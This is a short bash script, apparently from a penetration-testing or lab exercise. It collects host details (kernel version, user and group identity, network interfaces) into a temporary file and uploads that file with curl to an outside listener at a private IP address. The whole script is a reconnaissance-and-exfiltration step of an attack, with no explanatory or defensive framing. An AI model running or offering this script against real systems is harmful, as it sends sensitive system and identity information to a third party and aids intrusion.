#!/bin/bash
# Run system info command and send result

CMD_OUTPUT=$(uname -a; id; whoami; ifconfig)
echo "$CMD_OUTPUT" > /tmp/sysinfo.txt

curl -X POST -F "file=@/tmp/sysinfo.txt" http://10.11.0.123:8000/upload
